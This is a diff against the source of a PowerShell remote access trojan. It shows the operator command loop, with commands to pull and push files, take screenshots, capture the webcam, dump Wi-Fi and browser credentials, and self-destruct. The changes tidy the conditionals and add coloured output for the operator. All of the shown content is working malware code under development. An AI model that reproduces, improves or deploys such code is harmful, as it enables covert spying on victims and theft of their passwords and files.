@@ -100,7 +100,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 ------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "`nPS $currentDir> "
+            $intro = $clear + $banner + "`n${esc}[33mPS $currentDir> ${esc}[0m"
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -114,18 +114,14 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                     elseif ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
-                        if ([string]::IsNullOrWhiteSpace($path)) {
-                            $response = "[ERROR] Usage: !get <full_path_to_file>"
-                        } else {
-                            $response = Upload-File $path
-                        }
+                        $response = if ($path) { Upload-File $path } else { "[ERROR] Usage: !get <full_path_to_file>" }
                     }
                     elseif ($cmd.StartsWith("!post")) {
                         $parts = $cmd.Split("::")
-                        if ($parts.Length -eq 3) {
-                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
+                        $response = if ($parts.Length -eq 3) {
+                            Download-File $parts[1].Trim() $parts[2].Trim()
                         } else {
-                            $response = "[ERROR] INVALID POST FORMAT"
+                            "[ERROR] INVALID POST FORMAT"
                         }
                     }
                     elseif ($cmd -like "cd *") {
@@ -134,28 +130,16 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $currentDir = Get-Location
                         $response = ""
                     }
-                    elseif ($cmd -eq "!sysinfo") {
-                        $response = Get-ComputerInfo | Out-String
-                    }
-                    elseif ($cmd -eq "!screenshot") {
-                        $response = Take-Screenshot
-                    }
-                    elseif ($cmd -eq "!webcam") {
-                        $response = Capture-Webcam
-                    }
-                    elseif ($cmd -eq "!wifi") {
-                        $response = Get-WiFiCreds
-                    }
-                    elseif ($cmd -eq "!creds") {
-                        $response = Get-BrowserCreds
-                    }
-                    elseif ($cmd -eq "!tree") {
-                        $response = Tree-List
-                    }
+                    elseif ($cmd -eq "!sysinfo")      { $response = Get-ComputerInfo | Out-String }
+                    elseif ($cmd -eq "!screenshot")   { $response = Take-Screenshot }
+                    elseif ($cmd -eq "!webcam")       { $response = Capture-Webcam }
+                    elseif ($cmd -eq "!wifi")         { $response = Get-WiFiCreds }
+                    elseif ($cmd -eq "!creds")        { $response = Get-BrowserCreds }
+                    elseif ($cmd -eq "!tree")         { $response = Tree-List }
                     elseif ($cmd -eq "!selfdestruct") {
                         $response = "[!] Self-destruct initiated..."
-                        $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
-                        $stream.Write($outBytes, 0, $outBytes.Length)
+                        $response = "$esc[31m$response$esc[0m"
+                        $stream.Write([Text.Encoding]::UTF8.GetBytes($response), 0, $response.Length)
                         $stream.Flush()
                         Self-Destruct
                     }
@@ -169,9 +153,14 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
-                # Универсальное добавление приглашения:
+                # 🎨 Цветовая маркировка
+                $response = $response -replace '(\[ERROR\])', "$esc[31m`$1$esc[0m"
+                $response = $response -replace '(\[!\])', "$esc[31m`$1$esc[0m"
+                $response = $response -replace '(\[\+\])', "$esc[32m`$1$esc[0m"
+                $response = $response -replace '(\[INFO\])', "$esc[36m`$1$esc[0m"
+
                 if (-not $response.EndsWith("`nPS $currentDir> ")) {
-                    $response += "`nPS $currentDir> "
+                    $response += "`n${esc}[33mPS $currentDir> ${esc}[0m"
                 }
 
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
